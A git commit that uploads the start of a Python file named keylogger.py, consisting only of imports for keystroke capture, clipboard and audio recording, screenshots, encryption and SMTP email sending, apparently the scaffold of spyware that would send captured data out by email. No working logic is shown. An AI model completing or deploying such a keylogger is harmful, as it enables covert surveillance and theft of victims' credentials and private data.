6337a81ace6504c40f2556f5b9c41e9b1e76a3fb
sabrinalor <102542676+sabrinalor@users.noreply.github.com>
2023-09-27 10:39:10 -0500

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,29 @@
+# Libraries
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+
+import socket
+import platform
+
+import win32clipboard
+
+from pynput.keyboard import Key, Listener
+
+import time
+import os
+
+from scipy.io.wavfile import write
+import sounddevice as sd
+
+from cryptography.fernet import Fernet
+
+import getpass
+from requests import get
+
+from multiprocessing import Process, freeze_support
+from PIL import ImageGrab
+
